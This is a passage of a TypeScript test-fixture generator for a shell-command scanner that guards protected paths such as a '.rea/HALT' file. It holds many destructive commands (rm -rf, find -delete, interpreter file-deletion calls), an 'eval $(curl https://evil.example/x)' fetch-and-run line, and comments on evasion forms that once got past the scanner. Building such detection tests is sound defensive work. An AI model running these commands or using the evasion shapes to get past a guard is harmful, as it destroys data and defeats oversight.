    },
    {
      lang: 'python',
      flag: '-c',
      id: 'subprocess.Popen-shell',
      build: (t) => `import subprocess; subprocess.Popen('printf x > ${t}', shell=True)`,
    },
    {
      lang: 'python',
      flag: '-c',
      id: 'os.system',
      build: (t) => `import os; os.system('printf x > ${t}')`,
    },
    {
      lang: 'python',
      flag: '-c',
      id: 'os.popen',
      build: (t) => `import os; os.popen('printf x > ${t}', 'w').write('x')`,
    },
    {
      lang: 'python',
      flag: '-c',
      id: 'subprocess-stdout-open',
      build: (t) => `import subprocess; subprocess.run(['printf', 'x'], stdout=open('${t}','w'))`,
    },
  ];

  // Ruby — Pathname.new(...).write / FileUtils.cp/mv/cp_r/copy/move/
  // copy_file/rename / FileUtils.rm/rm_r/rm_rf/remove/mkdir/mkdir_p.
  const rbShapes: ApiCase[] = [
    {
      lang: 'ruby',
      flag: '-e',
      id: 'Pathname.write',
      build: (t) => `require "pathname"; Pathname.new("${t}").write("x")`,
    },
    {
      lang: 'ruby',
      flag: '-e',
      id: 'FileUtils.cp',
      build: (t) => `require "fileutils"; FileUtils.cp("src", "${t}")`,
    },
    {
      lang: 'ruby',
      flag: '-e',
      id: 'FileUtils.mv',
      build: (t) => `require "fileutils"; FileUtils.mv("src", "${t}")`,
    },
    {
      lang: 'ruby',
      flag: '-e',
      id: 'FileUtils.cp_r',
      build: (t) => `require "fileutils"; FileUtils.cp_r("srcdir", "${t}")`,
    },
    {
      lang: 'ruby',
      flag: '-e',
      id: 'FileUtils.copy',
      build: (t) => `require "fileutils"; FileUtils.copy("src", "${t}")`,
    },
    {
      lang: 'ruby',
      flag: '-e',
      id: 'FileUtils.move',
      build: (t) => `require "fileutils"; FileUtils.move("src", "${t}")`,
    },
    {
      lang: 'ruby',
      flag: '-e',
      id: 'FileUtils.copy_file',
      build: (t) => `require "fileutils"; FileUtils.copy_file("src", "${t}")`,
    },
    {
      lang: 'ruby',
      flag: '-e',
      id: 'FileUtils.rename',
      build: (t) => `require "fileutils"; FileUtils.rename("src", "${t}")`,
    },
    {
      lang: 'ruby',
      flag: '-e',
      id: 'FileUtils.rm',
      build: (t) => `require "fileutils"; FileUtils.rm("${t}")`,
    },
    {
      lang: 'ruby',
      flag: '-e',
      id: 'FileUtils.rm_rf',
      build: (t) => `require "fileutils"; FileUtils.rm_rf("${t}")`,
    },
  ];

  const allShapes = [...nodeShapes, ...pyShapes, ...rbShapes];

  // Quote-style: ALWAYS double-quote the outer payload (single-quote
  // inside) so `os.open('.rea/HALT', ...)` round-trips. We avoid
  // payloads containing literal `"`.
  for (const shape of allShapes) {
    for (const target of PROTECTED_TARGETS) {
      const payload = shape.build(target);
      if (payload.includes('"')) {
        // Use single-quoted outer form.
        fixtures.push({
          cmd: `${shape.lang} ${shape.flag} '${payload}'`,
          expect: 'block',
          klass: 'C-ext',
          label: `${shape.lang}-${shape.id}-${target}`,
          rationale: `${shape.lang} ${shape.flag} '${shape.id}' writes ${target}`,
        });
      } else {
        fixtures.push({
          cmd: `${shape.lang} ${shape.flag} "${payload}"`,
          expect: 'block',
          klass: 'C-ext',
          label: `${shape.lang}-${shape.id}-${target}`,
          rationale: `${shape.lang} ${shape.flag} "${shape.id}" writes ${target}`,
        });
      }
    }
    // Negative: same shape with non-protected target.
    const negPayload = shape.build(NEGATIVE_TARGETS[0]!);
    if (negPayload.includes('"')) {
      fixtures.push({
        cmd: `${shape.lang} ${shape.flag} '${negPayload}'`,
        expect: 'allow',
        klass: 'C-ext-neg',
        label: `${shape.lang}-${shape.id}-neg`,
        rationale: `${shape.lang} ${shape.flag} ${shape.id} non-protected target`,
      });
    } else {
      fixtures.push({
        cmd: `${shape.lang} ${shape.flag} "${negPayload}"`,
        expect: 'allow',
        klass: 'C-ext-neg',
        label: `${shape.lang}-${shape.id}-neg`,
        rationale: `${shape.lang} ${shape.flag} ${shape.id} non-protected target`,
      });
    }
  }

  return { fixtures, skipped: [] };
}

/**
 * Class D-ext — tar cluster shapes. Codex round 3 Finding 3 (P1).
 *
 * `tar -xzfC archive.tar.gz .rea/` — the cluster-flag `C` consumes
 * the next argv as the directory target.
 */
function classDExt(): GenerationResult {
  const fixtures: GeneratedFixture[] = [];

  const clusters = ['-xzfC', '-xfC', '-xJfC', '-xjfC', '-cfC', '-zxfC', '-vxzfC'];

  for (const cluster of clusters) {
    for (const target of PROTECTED_TARGETS) {
      // Form 1: cluster-with-C consumes archive then dir.
      fixtures.push({
        cmd: `tar ${cluster} archive.tar.gz ${target}`,
        expect: 'block',
        klass: 'D-ext',
        label: `tar-${cluster}-${target}`,
        rationale: `tar ${cluster} consumes argv: archive then dir=${target}`,
      });
    }
    // Negative: cluster-with-C to non-protected dir.
    fixtures.push({
      cmd: `tar ${cluster} archive.tar.gz docs/safe/`,
      expect: 'allow',
      klass: 'D-ext-neg',
      label: `tar-${cluster}-neg`,
      rationale: `tar ${cluster} to non-protected dir`,
    });
  }

  // Bundled `-C<path>` form.
  for (const target of PROTECTED_TARGETS) {
    fixtures.push({
      cmd: `tar -xf archive.tar -C${target.startsWith('.') ? target : '/' + target}`,
      expect: 'block',
      klass: 'D-ext',
      label: `tar-Cbundled-${target}`,
      rationale: `tar -xf -C<path> bundled form`,
    });
  }

  // Multiple Cs in one cluster — first C consumes the next argv (the
  // dir); behavior on second C is implementation-defined. The walker
  // emits multiple dir-targets.
  for (const target of PROTECTED_TARGETS) {
    fixtures.push({
      cmd: `tar -CxzfC . archive.tar.gz ${target}`,
      expect: 'block',
      klass: 'D-ext',
      label: `tar-multi-C-${target}`,
      rationale: `tar cluster with two Cs — second consumes ${target}`,
    });
  }

  return { fixtures, skipped: [] };
}

/**
 * Class B-ext — eval with cmdsubst / backtick. Codex round 3 Finding 1
 * (P0). `eval $(cmdsubst)` and `eval ` + backtick + `cmd` + backtick
 * have an empty static-concat (the cmdsubst can't be statically
 * resolved) but ARE dynamic — must refuse on uncertainty.
 */
function classBExt(): GenerationResult {
  const fixtures: GeneratedFixture[] = [];

  // The shell command itself is what we test — these forms ALL block
  // (regardless of target) because we cannot statically resolve the
  // eval payload.
  const evalForms = [
    `eval $(echo printf x)`,
    `eval \`echo printf x\``,
    `eval $VAR`,
    `eval $(cat scriptfile)`,
    `eval \`cat scriptfile\``,
    `eval "$VAR"`,
    `eval $(get_payload)`,
    `eval $(curl https://evil.example/x)`,
    `eval echo $X`,
    `eval $cmd $arg`,
  ];
  for (const cmd of evalForms) {
    fixtures.push({
      cmd,
      expect: 'block',
      klass: 'B-ext',
      label: `eval-dynamic-${cmd.slice(0, 30).replace(/[^a-z0-9]/gi, '-')}`,
      rationale: `${cmd} — eval with dynamic argv must refuse on uncertainty`,
    });
  }

  // Negative: eval with PURELY STATIC payload that doesn't write a
  // protected path. Should ALLOW.
  fixtures.push({
    cmd: `eval 'echo hello'`,
    expect: 'allow',
    klass: 'B-ext-neg',
    label: `eval-static-echo-neg`,
    rationale: `eval with static benign payload`,
  });
  fixtures.push({
    cmd: `eval "true"`,
    expect: 'allow',
    klass: 'B-ext-neg',
    label: `eval-true-neg`,
    rationale: `eval "true" — no write`,
  });

  return { fixtures, skipped: [] };
}

/**
 * Class L — destructive-primitive corpus. Codex round 4 structural
 * corpus extension. Generates fixtures that exercise:
 *
 *   1. recursive rm: `rm -rf <DIR>`, `rm -r <DIR>`, `rm -fR <DIR>`
 *   2. rmdir: `rmdir <DIR>` (always destructive)
 *   3. find -delete: `find <DIR> -delete`, `find . -name BASENAME -delete`
 *   4. mv source-side: `mv <PROTECTED> <ELSEWHERE>`
 *   5. interpreter destructive APIs:
 *        python: shutil.rmtree, Path(...).unlink/rmdir/touch, os.removedirs
 *        node: fs.rmSync({recursive:true}), fs.rmdirSync, fs.unlinkSync
 *        ruby: FileUtils.rm_rf, FileUtils.remove_dir, File.delete, File.unlink
 *        perl: unlink, rename
 *
 * Targets: PROTECTED_DIR_ANCESTORS (bare-dir, ancestor of protected file)
 * AND PROTECTED_TARGETS (literal protected file). All must BLOCK.
 *
 * Negatives: NEGATIVE_DIR_TARGETS (dist/, tmp/) + NEGATIVE_TARGETS for
 * the literal-file destructive forms.
 */
function classL(): GenerationResult {
  const fixtures: GeneratedFixture[] = [];

  // 1+2+3+4: bash-tier destructive primitives.
  type DestructiveBash = { id: string; build: (target: string) => string };
  const bashDestructives: DestructiveBash[] = [
    { id: 'rm-rf', build: (t) => `rm -rf ${t}` },
    { id: 'rm-r', build: (t) => `rm -r ${t}` },
    { id: 'rm-fR', build: (t) => `rm -fR ${t}` },
    { id: 'rm-Rf', build: (t) => `rm -Rf ${t}` },
    { id: 'rm-recursive', build: (t) => `rm --recursive --force ${t}` },
    { id: 'rmdir', build: (t) => `rmdir ${t}` },
    { id: 'find-delete', build: (t) => `find ${t} -delete` },
  ];
  // For directory-only destructive ops (rmdir works on dirs only; rm -rf
  // is fine on either; mv-source works on files better).
  for (const dir of PROTECTED_DIR_ANCESTORS) {
    for (const dform of bashDestructives) {
      fixtures.push({
        cmd: dform.build(dir),
        expect: 'block',
        klass: 'L',
        label: `bash-destructive-${dform.id}-${dir.replace(/[^a-z0-9]/gi, '_')}`,
        rationale: `${dform.id} on ancestor ${dir} — protected-ancestry must catch`,
      });
    }
  }
  // Literal protected files via destructive ops.
  for (const file of PROTECTED_TARGETS) {
    for (const dform of bashDestructives) {
      // rmdir is dir-only; on a file it's a runtime error but the
      // scanner still flags it (treat the path as the target).
      fixtures.push({
        cmd: dform.build(file),
        expect: 'block',
        klass: 'L',
        label: `bash-destructive-${dform.id}-${file.replace(/[^a-z0-9]/gi, '_')}`,
        rationale: `${dform.id} on protected file ${file}`,
      });
    }
    // mv source-side — protected source removed.
    fixtures.push({
      cmd: `mv ${file} /tmp/stash`,
      expect: 'block',
      klass: 'L',
      label: `mv-source-${file.replace(/[^a-z0-9]/gi, '_')}`,
      rationale: `mv source-side: ${file} is removed at original path`,
    });
    fixtures.push({
      cmd: `mv ${file} ${file}.bak`,
      expect: 'block',
      klass: 'L',
      label: `mv-source-bak-${file.replace(/[^a-z0-9]/gi, '_')}`,
      rationale: `mv ${file} ${file}.bak — both sides protected (source-side write)`,
    });
  }
  // find -name BASENAME -delete in cwd — refuse on uncertainty.
  for (const file of PROTECTED_TARGETS) {
    const base = file.split('/').pop() ?? file;
    fixtures.push({
      cmd: `find . -name ${base} -delete`,
      expect: 'block',
      klass: 'L',
      label: `find-name-delete-${base}`,
      rationale: `find . -name ${base} -delete — cwd ancestor + name predicate`,
    });
  }

  // 5: interpreter destructive APIs.
  type InterpDestr = { lang: string; flag: string; id: string; build: (t: string) => string };
  const interpDestrs: InterpDestr[] = [
    // Python
    {
      lang: 'python',
      flag: '-c',
      id: 'shutil.rmtree',
      build: (t) => `import shutil; shutil.rmtree('${t}')`,
    },
    {
      lang: 'python',
      flag: '-c',
      id: 'os.removedirs',
      build: (t) => `import os; os.removedirs('${t}')`,
    },
    {
      lang: 'python',
      flag: '-c',
      id: 'pathlib.unlink',
      build: (t) => `from pathlib import Path; Path('${t}').unlink()`,
    },
    {
      lang: 'python',
      flag: '-c',
      id: 'pathlib.rmdir',
      build: (t) => `from pathlib import Path; Path('${t}').rmdir()`,
    },
    {
      lang: 'python',
      flag: '-c',
      id: 'pathlib.touch',
      build: (t) => `from pathlib import Path; Path('${t}').touch()`,
    },
    // Node
    {
      lang: 'node',
      flag: '-e',
      id: 'fs.rmSync-recursive',
      build: (t) => `require('fs').rmSync('${t}', {recursive:true})`,
    },
    {
      lang: 'node',
      flag: '-e',
      id: 'fs.rmdirSync',
      build: (t) => `require('fs').rmdirSync('${t}')`,
    },
    // Ruby
    {
      lang: 'ruby',
      flag: '-e',
      id: 'FileUtils.rm_rf',
      build: (t) => `require "fileutils"; FileUtils.rm_rf("${t}")`,
    },
    {
      lang: 'ruby',
      flag: '-e',
      id: 'FileUtils.remove_dir',
      build: (t) => `require "fileutils"; FileUtils.remove_dir("${t}")`,
    },
    {
      lang: 'ruby',
      flag: '-e',
      id: 'File.delete',
      build: (t) => `File.delete("${t}")`,
    },
    {
      lang: 'ruby',
      flag: '-e',
      id: 'File.unlink',
      build: (t) => `File.unlink("${t}")`,
    },
    // Perl
    {
      lang: 'perl',
      flag: '-e',
      id: 'perl-unlink',
      build: (t) => `unlink "${t}"`,
    },
  ];
  for (const target of [...PROTECTED_TARGETS, ...PROTECTED_DIR_ANCESTORS]) {
    for (const shape of interpDestrs) {
      const payload = shape.build(target);
      const cmd = payload.includes('"')
        ? `${shape.lang} ${shape.flag} '${payload}'`
        : `${shape.lang} ${shape.flag} "${payload}"`;
      fixtures.push({
        cmd,
        expect: 'block',
        klass: 'L',
        label: `interp-${shape.lang}-${shape.id}-${target.replace(/[^a-z0-9]/gi, '_')}`,
        rationale: `${shape.lang} ${shape.id} on ${target}`,
      });
    }
  }

  // Negatives: same destructive shapes against non-protected dirs.
  for (const dir of NEGATIVE_DIR_TARGETS) {
    for (const dform of bashDestructives) {
      fixtures.push({
        cmd: dform.build(dir),
        expect: 'allow',
        klass: 'L-neg',
        label: `bash-destructive-neg-${dform.id}-${dir.replace(/[^a-z0-9]/gi, '_')}`,
        rationale: `${dform.id} on non-protected ${dir}`,
      });
    }
  }
  // Negative interpreter — non-protected file.
  for (const shape of interpDestrs) {
    const payload = shape.build(NEGATIVE_TARGETS[0]!);
    const cmd = payload.includes('"')
      ? `${shape.lang} ${shape.flag} '${payload}'`
      : `${shape.lang} ${shape.flag} "${payload}"`;
    fixtures.push({
      cmd,
      expect: 'allow',
      klass: 'L-neg',
      label: `interp-neg-${shape.lang}-${shape.id}`,
      rationale: `${shape.lang} ${shape.id} on non-protected target`,
    });
  }

  return { fixtures, skipped: [] };
}

/**
 * Class N — loop-construct cmdsubst (round 6 architectural-refactor
 * regression class).
 *
 * Pre-0.23.0-round-6 the walker dispatched on Cmd kinds and manually
 * traversed each kind's specific fields. WhileClause / UntilClause
 * dispatched only `.Do`; ForClause dispatched `.Do` and `.Loop.Items`
 * but not `.CStyleLoop.{Init,Cond,Post}`. The cond-side and arithmetic-
 * for slots were silently dropped — every `while $(rm); do :; done`,
 * `until [[ -n $(rm) ]]; do :; done`, `for ((i=$(rm); ...))` shape
 * bypassed every detector.
 *
 * Round 6 closes this structurally: `walkForWrites` now drives a
 * deny-by-default `syntax.Walk()` traversal that visits every field
 * of every node. This corpus class pins regression coverage so any
 * future regression to per-Cmd-kind dispatch reintroducing the gap
 * fails immediately.
 *
 * Cross-product: every loop construct × every cond/init/post slot ×
 * every cmdsubst placement (bare $(rm), [[ -n $(rm) ]], redirect on
 * cond, procsubst, here-string) × every protected target.
 *
 * Negatives: identical loop shapes targeting non-protected paths.
 */
function classN(): GenerationResult {
  const fixtures: GeneratedFixture[] = [];

  type LoopShape = {
    id: string;
    /** Build a loop whose detection path goes through CmdSubst-on-target. */
    build: (target: string) => string;
  };

  const shapes: LoopShape[] = [
    // ── WhileClause cond-side cmdsubst ─────────────────────────────
    { id: 'while-cond-cmdsubst', build: (t) => `while $(rm ${t}); do :; done` },
    { id: 'while-cond-test-cmdsubst', build: (t) => `while [[ -n $(rm ${t}) ]]; do :; done` },
    { id: 'while-cond-test-eq', build: (t) => `while [[ "x" == $(rm ${t}) ]]; do :; done` },
    { id: 'while-cond-redirect', build: (t) => `while true > ${t}; do break; done` },
    { id: 'while-cond-procsubst', build: (t) => `while read x < <(rm ${t}); do break; done` },
    { id: 'while-cond-echo-redirect', build: (t) => `while echo > ${t}; do break; done` },
    { id: 'while-cond-arithmetic', build: (t) => `while (( $(rm ${t} | wc -l) )); do break; done` },
    // ── UntilClause cond-side cmdsubst ─────────────────────────────
    { id: 'until-cond-cmdsubst', build: (t) => `until $(rm ${t}); do :; done` },
    { id: 'until-cond-test-cmdsubst', build: (t) => `until [[ -n $(rm ${t}) ]]; do :; done` },
    { id: 'until-cond-redirect', build: (t) => `until false > ${t}; do break; done` },
    { id: 'until-cond-procsubst', build: (t) => `until read x < <(rm ${t}); do break; done` },
    // ── ForClause C-style Init/Cond/Post cmdsubst ─────────────────
    {
      id: 'for-cstyle-init-cmdsubst',
      build: (t) => `for ((i=$(rm ${t}|wc -l); i<3; i++)); do :; done`,
    },
    {
      id: 'for-cstyle-cond-cmdsubst',
      build: (t) => `for ((i=0; i<$(rm ${t}|wc -l); i++)); do :; done`,
    },
    {
      id: 'for-cstyle-post-cmdsubst',
      build: (t) => `for ((i=0; i<3; i+=$(rm ${t}|wc -l))); do :; done`,
    },
    // ── ForClause word-list cmdsubst (already-covered .Loop.Items
    //    path; included for parity coverage) ────────────────────────
    { id: 'for-wordlist-cmdsubst', build: (t) => `for x in $(rm ${t}); do :; done` },
    // ── SelectClause word-list cmdsubst ────────────────────────────
    { id: 'select-wordlist-cmdsubst', build: (t) => `select x in $(rm ${t}); do break; done` },
    // ── If composition with loops (nested round-6 PoC) ─────────────
    {
      id: 'if-then-until-cond',
      build: (t) => `if true; then until $(rm ${t}); do :; done; fi`,
    },
    {
      id: 'while-do-while-cond',
      build: (t) => `while true; do while $(rm ${t}); do :; done; break; done`,
    },
    {
      id: 'function-body-while-cond',
      build: (t) => `f() { while $(rm ${t}); do :; done; }; f`,
    },
    {
      id: 'subshell-while-cond',
      build: (t) => `( while $(rm ${t}); do :; done )`,
    },
    // ── DeclClause-RHS in loop cond ───────────────────────────────
    {
      id: 'while-decl-rhs',
      build: (t) => `while local x=$(rm ${t}); do break; done`,
    },
  ];

  for (const target of PROTECTED_TARGETS) {
    for (const shape of shapes) {
      fixtures.push({
        cmd: shape.build(target),
        expect: 'block',
        klass: 'N',
        label: `${shape.id}-${target.replace(/[^a-z0-9]/gi, '_')}`,
        rationale: `loop-construct cmdsubst (${shape.id}) writes to protected ${target}`,
      });
    }
  }

  // Negatives — identical shapes, non-protected targets.
  for (const target of NEGATIVE_TARGETS) {
    for (const shape of shapes) {
      fixtures.push({
        cmd: shape.build(target),
        expect: 'allow',
        klass: 'N-neg',
        label: `${shape.id}-${target.replace(/[^a-z0-9]/gi, '_')}`,
        rationale: `loop-construct cmdsubst (${shape.id}) on non-protected ${target}`,
      });
    }
  }

  return { fixtures, skipped: [] };
}

/**
 * Class O — ParamExp.Slice Walk-gap regression class.
 *
 * Codex round 7 (P0): mvdan-sh@0.10.1's `syntax.Walk` does NOT recurse
 * into `ParamExp.Slice.Offset` / `Slice.Length` — both are `Word` nodes
 * that can hold `CmdSubst` payloads. The deny-by-default refactor
 * inherited that gap. Pre-fix `${X:$(rm /tmp/x)}` parsed but the
 * dispatcher never saw the inner `rm`.
 *
 * This class permutes:
 *   - parameter slice forms (offset-only, offset+length, negative,
 *     parenthesized, positional `@`/`*`, array `arr[@]:N`/`arr[*]:N`)
 *   - quoting (bare, double-quoted)
 *   - enclosing context (echo, `:`, assignment-rhs, subshell, function,
 *     if-cond, while-cond, redirect-target)
 *
 * For each (shape × protected target) we emit a `block` fixture; for
 * each (shape × negative target) an `allow` fixture. Cross-product
 * pinning ensures the round-7 closure can't regress silently.
 */
function classO(): GenerationResult {
  const fixtures: GeneratedFixture[] = [];

  type SliceShape = {
    id: string;
    /** Build a paramexp-slice form whose Offset/Length contains $(rm <target>). */
    build: (target: string) => string;
    /**
     * Skip the negative variant. Some slice shapes embed the cmdsubst
     * inside a redirect target (`tee ${X:$(rm)}`, `cmd > ${X:$(rm)}`).
     * The redirect target is dynamic — the scanner correctly fails-closed
     * on dynamic redirect targets regardless of whether the inner `rm`
     * resolves to a protected or non-protected path. So the "non-protected
     * target → allow" negative is a category error: the redirect target
     * itself is the unresolvable, not the rm operand. We block these
     * shapes from the negative cross-product.
     */
    skipNegative?: true;
  };

  const shapes: SliceShape[] = [
    // Round-7 PoC #1–#4: bare offset/length forms.
    { id: 'slice-offset-dq', build: (t) => `echo "\${X:$(rm ${t})}"` },
    { id: 'slice-length-dq', build: (t) => `echo "\${X:0:$(rm ${t})}"` },
    { id: 'slice-offset-neg-dq', build: (t) => `echo "\${X: -$(rm ${t})}"` },
    { id: 'slice-offset-arith-dq', build: (t) => `echo "\${X:($(rm ${t}))}"` },
    // Round-7 PoC #5–#7: `:` as null-command + bare/double-quoted.
    { id: 'slice-offset-null-cmd', build: (t) => `: \${X:$(rm ${t})}` },
    { id: 'slice-length-null-cmd', build: (t) => `: \${X:0:$(rm ${t})}` },
    { id: 'slice-length-dq-null', build: (t) => `: "\${A:$(rm ${t}):3}"` },
    // Round-7 PoC #8: assignment RHS slice.
    { id: 'slice-offset-assign', build: (t) => `Y=\${X:$(rm ${t})}` },
    // Round-7 PoC #9–#10: positional params.
    { id: 'slice-positional-at', build: (t) => `echo "\${@:$(rm ${t})}"` },
    { id: 'slice-positional-star', build: (t) => `echo "\${*:$(rm ${t})}"` },
    // Round-7 PoC #11–#12: array variants.
    { id: 'slice-array-at', build: (t) => `echo "\${arr[@]:$(rm ${t})}"` },
    { id: 'slice-array-star-len', build: (t) => `echo "\${arr[*]:$(rm ${t}):3}"` },
    // Round-7 PoC #13: subshell wrap.
    { id: 'slice-subshell', build: (t) => `(echo \${X:$(rm ${t})})` },
    // Round-7 PoC #14: function-body.
    { id: 'slice-funcbody', build: (t) => `f() { echo \${X:$(rm ${t})}; }; f` },
    // Round-7 PoC #15: while-cond.
    {
      id: 'slice-while-cond',
      build: (t) => `while echo \${X:$(rm ${t})}; do break; done`,
    },
    // Round-7 PoC #16: redirect target. Note that the cmdsubst is on
    // the LHS, not the redirect path — `> /tmp/out` is static. The
    // negative cross-product is fine here.
    { id: 'slice-redirect-target', build: (t) => `echo \${X:$(rm ${t})} > /tmp/out` },
    // Round-7 PoC #17: if-cond.
    { id: 'slice-if-cond', build: (t) => `if echo \${X:$(rm ${t})}; then :; fi` },
    // Cross-product extras: composition with rm flags + alternates.
    {
      id: 'slice-offset-rm-rf',
      build: (t) => `echo "\${X:$(rm -rf ${t})}"`,
    },
    {
      id: 'slice-length-rm-f',
      build: (t) => `echo "\${X:0:$(rm -f ${t})}"`,
    },
    // Composition: slice-inside-double-quote-inside-block.
    {
      id: 'slice-block-dq',
      build: (t) => `{ echo "\${X:$(rm ${t})}"; }`,
    },
    // Composition: slice-inside-binarycmd RHS (after &&).
    {
      id: 'slice-binarycmd-rhs',
      build: (t) => `true && echo "\${X:$(rm ${t})}"`,
    },
    // Composition: slice-inside-pipe.
    {
      id: 'slice-pipe-rhs',
      build: (t) => `true | echo "\${X:$(rm ${t})}"`,
    },
    // Nested ParamExp inside Slice — Walk visits the outer ParamExp,
    // we re-enter Slice; the inner ParamExp is in Slice.Offset and
    // we re-Walk it which fires recurseParamExpSlice again. Tests the
    // fixed-point recursion — every level of nested slicing reaches
    // every CmdSubst.
    {
      id: 'slice-nested-paramexp',
      build: (t) => `echo "\${X:\${Y:$(rm ${t})}}"`,
    },
    // Mixed redirect on slice form. The tee arg is `${X:$(rm)}` — a
    // dynamic redirect target — so the scanner blocks regardless of
    // whether the inner rm is protected (the cmdsubst piping forces
    // dynamic-target fail-closed). Skip the negative variant: a
    // non-protected inner rm STILL blocks because the tee target
    // itself is dynamic, which is the correct behavior, not a negative.
    {
      id: 'slice-tee-arg',
      build: (t) => `echo x | tee \${X:$(rm ${t})}`,
      skipNegative: true,
    },
  ];

  for (const target of PROTECTED_TARGETS) {
    for (const shape of shapes) {
      fixtures.push({
        cmd: shape.build(target),
        expect: 'block',
        klass: 'O',
        label: `${shape.id}-${target.replace(/[^a-z0-9]/gi, '_')}`,
        rationale: `ParamExp.Slice.Offset/Length walk-gap closure (${shape.id}) writes to protected ${target}`,
      });
    }
  }

  // Negatives — identical shapes, non-protected targets. Shapes flagged
  // with `skipNegative: true` are excluded because their structure
  // forces fail-closed regardless of the rm operand (e.g. tee with a
  // dynamic redirect target).
  for (const target of NEGATIVE_TARGETS) {
    for (const shape of shapes) {
      if (shape.skipNegative) continue;
      fixtures.push({
        cmd: shape.build(target),
        expect: 'allow',
        klass: 'O-neg',
        label: `${shape.id}-${target.replace(/[^a-z0-9]/gi, '_')}`,
        rationale: `ParamExp.Slice form (${shape.id}) on non-protected ${target} (negative)`,
      });
    }
  }

  return { fixtures, skipped: [] };
}

/**
 * Class P — nested-shell DQ-escape fidelity corpus (round-8 P0).
 *
 * Background: round-8 P0 was that `unshellEscape` only collapsed `\"`
 * and `\'` — DQ-significant escapes `\$`, `\\`, and `` \` `` were left
 * as literal backslashes when the walker re-parsed the inner payload of
 * a `bash -c "..."` invocation. The verified end-to-end exploit:
 *
 *     bash -c "echo \"\$(touch /tmp/HACK_PROOF)\""
 *     # Real shell collapses `\$` → `$`, evaluates the CmdSubst.
 *     # Walker saw `\$` as a literal `$` — no CmdSubst child — ALLOW.
 *     # Same shape against `.rea/HALT` bypassed protected-paths.
 *
 * This class pins the closure: every nested-shell invocation form
 * (bash/sh/zsh/dash + backticks), composed with every DQ-significant
 * escape sequence and every protected target, must BLOCK. Negatives
 * pin the false-positive boundary: shapes that look DQ-escape-similar
 * but contain no actual command substitution must ALLOW.
 *
 * The acceptance contract for positives is end-to-end: the scanner's
 * verdict (after the DQ-escape collapse, the inner re-parse, the
 * dispatcher, and the path-normalize) must be `block`. Walker-only
 * proof-of-reach is NOT enough at this layer — the integration must
 * close.
 */
function classP(): GenerationResult {
  const fixtures: GeneratedFixture[] = [];

  // Nested-shell launcher binaries. Each variant goes through the same
  // detectNestedShell path — the helper recognizes any cluster of -c
  // shorts when the head matches a shell name.
  const SHELLS = ['bash', 'sh', 'zsh', 'dash', 'ksh'] as const;

  // DQ-escape shapes. Each shape returns the BODY string that goes
  // inside `<shell> -c "..."`. The walker's pre-fix bug was that the
  // backslash-prefixed cmdsubst delimiters were not collapsed, so the
  // re-parser saw a literal `$` or `` ` `` instead of a CmdSubst child.
  type EscapeShape = {
    id: string;
    /**
     * Return the body to place inside the outer DQ. The body itself
     * uses backslash-escaped DQs (`\"`) and backslash-escaped
     * cmdsubst delimiters where applicable. The fixture composer
     * wraps it in `<shell> -c "<body>"`.
     */
    body: (target: string) => string;
  };

  const escapeShapes: EscapeShape[] = [
    // Round-8 PoC #1 — basic DQ-escape on $().
    {
      id: 'dq-cmdsubst-dollar',
      body: (t) => `echo \\"\\$(rm ${t})\\"`,
    },
    // Round-8 PoC #2 — backtick variant.
    {
      id: 'dq-cmdsubst-backtick',
      body: (t) => `echo \\"\\\`rm ${t}\\\`\\"`,
    },
    // Round-8 PoC #3 — DQ-escape inside ParamExp.Slice.Offset.
    {
      id: 'dq-paramexp-slice-offset',
      body: (t) => `echo \\"\\\${X:\\$(rm ${t})}\\"`,
    },
    // Round-8 PoC #4 — DQ-escape inside ParamExp.Slice.Length.
    {
      id: 'dq-paramexp-slice-length',
      body: (t) => `echo \\"\\\${X:0:\\$(rm ${t})}\\"`,
    },
    // Round-8 PoC #5 — DQ-escape inside array slice.
    {
      id: 'dq-paramexp-slice-array',
      body: (t) => `echo \\"\\\${arr[@]:\\$(rm ${t}):3}\\"`,
    },
    // Round-8 PoC #6 — escaped-backslash before cmdsubst (mixed).
    // Real shell collapses `\\\\` → `\\`, then sees `$(...)`. Walker
    // must do the same.
    {
      id: 'dq-mixed-escape',
      body: (t) => `echo \\"\\\\$(rm ${t})\\"`,
    },
    // Round-8 PoC #7 — DQ-escape on a redirect target.
    {
      id: 'dq-redirect-target',
      body: (t) => `echo x > \\"\\$(rm ${t})\\"`,
    },
    // Round-8 PoC #8 — DQ-escape inside subshell.
    {
      id: 'dq-subshell',
      body: (t) => `(echo \\"\\$(rm ${t})\\")`,
    },
    // Round-8 extra — DQ-escape inside while-cond.
    {
      id: 'dq-while-cond',
      body: (t) => `while echo \\"\\$(rm ${t})\\"; do break; done`,
    },
    // Round-8 extra — DQ-escape inside if-cond.
    {
      id: 'dq-if-cond',
      body: (t) => `if echo \\"\\$(rm ${t})\\"; then :; fi`,
    },
    // Round-8 extra — DQ-escape inside binary RHS.
    {
      id: 'dq-binarycmd-rhs',
      body: (t) => `true && echo \\"\\$(rm ${t})\\"`,
    },
    // Round-8 extra — DQ-escape inside CallExpr assignment value.
    {
      id: 'dq-assign-value',
      body: (t) => `Y=\\"\\$(rm ${t})\\"`,
    },
    // Round-8 extra — DQ-escape inside funcdecl body.
    {
      id: 'dq-funcdecl-body',
      body: (t) => `f() { echo \\"\\$(rm ${t})\\"; }; f`,
    },
    // Round-8 extra — DQ-escape inside ParamExp.Exp default.
    {
      id: 'dq-paramexp-exp-default',
      body: (t) => `echo \\"\\\${X:-\\$(rm ${t})}\\"`,
    },
    // Round-8 extra — DQ-escape inside CmdSubst.Stmts (nested $(...)).
    {
      id: 'dq-cmdsubst-nested',
      body: (t) => `echo \\"\\$(echo \\$(rm ${t}))\\"`,
    },
    // Round-8 extra — DQ-escape inside arithmetic expansion.
    {
      id: 'dq-arithm-exp',
      body: (t) => `echo \\"\\$((1+\\$(rm ${t})))\\"`,
    },
    // Round-8 extra — Mixed cmdsubst + paramexp on same line.
    // Note: `\\${X}` is a JS-template-literal escape for the literal
    // `\${X}` shell text; we must double-escape the `$` so JS doesn't
    // interpolate it. The shell sees `\${X}` in DQ context, which
    // unshellEscape collapses to `${X}` before the inner re-parse.
    {
      id: 'dq-cmdsubst-and-paramexp',
      body: (t) => 'echo \\"\\${X}\\$(rm ' + t + ')\\"',
    },
  ];

  for (const shell of SHELLS) {
    for (const target of PROTECTED_TARGETS) {
      for (const shape of escapeShapes) {
        fixtures.push({
          cmd: `${shell} -c "${shape.body(target)}"`,
          expect: 'block',
          klass: 'P',
          label: `${shell}-${shape.id}-${target.replace(/[^a-z0-9]/gi, '_')}`,
          rationale: `Round-8 P0 unshellEscape DQ-escape parity — ${shell} -c "${shape.id}" against ${target}`,
        });
      }
    }
  }

  // Negatives — DQ shapes that look similar but contain no real cmdsubst.
